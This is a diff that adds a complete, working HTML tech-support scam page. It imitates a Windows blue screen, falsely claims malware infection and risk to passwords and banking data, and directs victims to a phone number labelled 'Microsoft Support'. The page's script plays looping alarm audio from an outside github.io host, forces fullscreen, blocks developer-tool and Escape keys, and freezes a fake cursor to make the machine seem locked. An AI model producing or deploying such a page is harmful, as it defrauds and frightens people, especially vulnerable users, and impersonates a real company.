@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Critical System Alert</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      background: #0000AA;
+      overflow: hidden;
+      user-select: none;
+      cursor: none;
+      font-family: Consolas, monospace;
+      color: #FFFFFF;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 800px;
+      padding: 20px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    .bso-text {
+      font-size: 18px;
+      line-height: 1.5;
+      z-index: 10;
+    }
+    #errorFeed {
+      width: 100%;
+      height: 200px;
+      overflow-y: auto;
+      white-space: pre-line;
+      margin: 20px 0;
+      font-size: 16px;
+      line-height: 1.3;
+      border-top: 1px solid rgba(255, 255, 255, 0.2);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 10px 0;
+      text-align: left;
+    }
+    #effectBox {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.7);
+      color: yellow;
+      padding: 8px 20px;
+      border: 1px solid yellow;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 16px;
+      display: none;
+      z-index: 999;
+    }
+    .custom-cursor {
+      position: fixed;
+      width: 32px;
+      height: 32px;
+      background: url('data:image/svg+xml;utf8,<svg width="32" height="32" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M4 4 L4 20 L10 14 L16 20 L14 12 L20 10 L12 4 Z" fill="rgba(255, 255, 255, 0.8)" stroke="rgba(255, 255, 255, 1)" stroke-width="2"/></svg>') no-repeat center;
+      pointer-events: none;
+      z-index: 5;
+    }
+
+    @keyframes blink {
+      0%, 50%, 100% { visibility: visible; }
+      25%, 75% { visibility: hidden; }
+    }
+
+    .support-box {
+      display: inline-block;
+      background: #2222AA;
+      padding: 6px 14px;
+      border: 1px solid yellow;
+      color: yellow;
+      font-weight: bold;
+      animation: heartbeat 1.2s infinite;
+      border-radius: 4px;
+    }
+
+    @keyframes heartbeat {
+      0%, 100% {
+        transform: scale(1);
+        box-shadow: 0 0 10px yellow;
+      }
+      50% {
+        transform: scale(1.08);
+        box-shadow: 0 0 20px yellow;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="wrapper">
+  <!-- Static Message Top -->
+  <div class="bso-text" id="topMessage">
+    *** SYSTEM CRITICAL ERROR: 0x0000007E (0xF78D2524, 0xC0000034, 0x00000000, 0x00000000)<br><br>
+    A fatal error has been detected and your Windows system has been LOCKED to prevent irreversible damage.<br><br>
+  </div>
+
+  <!-- Error Feed -->
+  <div id="errorFeed"></div>
+
+  <!-- Static Message Bottom -->
+  <div class="bso-text" id="bottomMessage">
+    ⚠ Unauthorized remote access and malware infection detected.<br>
+    ⚠ Your personal data, passwords, and banking information are at SEVERE RISK.<br><br>
+    DO NOT shut down or restart your computer.<br>
+    Doing so may result in complete system corruption and PERMANENT DATA LOSS.<br><br>
+    IMMEDIATE ACTION REQUIRED:<br><br>
+
+    <span class="support-box">
+      ☎ Toll-Free Microsoft Support: +1-844-709-2550
+    </span><br><br>
+
+    Waiting for technician intervention...<br>
+    _<span id="blinker">█</span>
+  </div>
+</div>
+
+<!-- Other Elements -->
+<div id="effectBox"></div>
+<div id="fakeCursor" class="custom-cursor"></div>
+
+<audio id="alertSound" loop>
+  <source src="https://1992gameofthrone1992.github.io/imagetopa/beep.wav" type="audio/wav" />
+</audio>
+
+<script>
+  const audio = document.getElementById('alertSound');
+  const effectBox = document.getElementById('effectBox');
+  const fakeCursor = document.getElementById('fakeCursor');
+
+  // Start fullscreen and sound on click
+  document.body.addEventListener('click', () => {
+    triggerFullScreen();
+    audio.play();
+  });
+
+  // Blinker
+  setInterval(() => {
+    const blinker = document.getElementById('blinker');
+    blinker.style.visibility = (blinker.style.visibility === 'hidden') ? 'visible' : 'hidden';
+  }, 500);
+
+  // Random alert box at bottom
+  setInterval(() => {
+    const messages = [
+      "Loading system files...",
+      "Analyzing memory dump...",
+      "Critical error: 0x8007045D",
+      "Malware signature found...",
+      "Kernel panic detected...",
+      "Encrypting system logs...",
+      "Security lockdown initiated...",
+      "Unauthorized login attempt blocked...",
+      "Disk corruption detected...",
+      "Firewall breach attempt logged..."
+    ];
+    const msg = messages[Math.floor(Math.random() * messages.length)];
+    effectBox.textContent = msg;
+    effectBox.style.display = 'block';
+    setTimeout(() => {
+      effectBox.style.display = 'none';
+    }, 4000);
+  }, 10000);
+
+  // Fullscreen trigger
+  function triggerFullScreen() {
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    else if (el.msRequestFullscreen) el.msRequestFullscreen();
+  }
+
+  // Disable inspect
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    if (
+      e.keyCode === 123 ||
+      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
+      (e.ctrlKey && e.keyCode === 85) ||
+      e.key === 'Escape'
+    ) {
+      e.preventDefault();
+    }
+  });
+
+  // Fake frozen cursor
+  const freezeX = window.innerWidth / 2;
+  const freezeY = window.innerHeight / 2;
+  fakeCursor.style.left = `${freezeX}px`;
+  fakeCursor.style.top = `${freezeY}px`;
+  document.addEventListener('mousemove', () => {
+    fakeCursor.style.left = `${freezeX}px`;
+    fakeCursor.style.top = `${freezeY}px`;
+  });
+
+  // Error feed animation
+  const errorFeed = document.getElementById('errorFeed');
+  const errorLines = [
+    ">>> SYSTEM CHECK: FAILED",
+    ">>> ERROR CODE 0xC004F009: Activation buffer overflow",
+    ">>> DRIVER_MISMANAGEMENT: usb_root_hub.sys",
+    ">>> SYSTEM_HEAP_CORRUPTION: Detected",
+    ">>> Attempting recovery...",
+    ">>> Recovery failed.",
+    ">>> Allocating additional memory for dump analysis...",
+    ">>> Warning: Access to protected memory space denied.",
+    ">>> Executing shutdown hooks...",
+    ">>> ERROR: Watchdog timeout exceeded.",
+    ">>> NTFS_VOLUME_CORRUPT: Sector 49152",
+    ">>> USERDATA_ENCRYPTION_FAILED: Key not found",
+    ">>> Injecting cleanup routines...",
+    ">>> Critical kernel handler not responding.",
+    ">>> SYSTEM MODULE UNRESPONSIVE: hal.dll",
+    ">>> Malware activity increasing...",
+    ">>> Remote connection attempt: BLOCKED",
+    ">>> STATUS: UNSTABLE"
+  ];
+
+  let errorIndex = 0;
+  function addErrorLine() {
+    const line = errorLines[errorIndex];
+    const lineElement = document.createElement('div');
+    lineElement.textContent = line;
+    errorFeed.appendChild(lineElement);
+    errorFeed.scrollTop = errorFeed.scrollHeight;
+    errorIndex = (errorIndex + 1) % errorLines.length;
+    setTimeout(addErrorLine, 1200);
+  }
+  addErrorLine();
+</script>
+
+</body>
+</html>
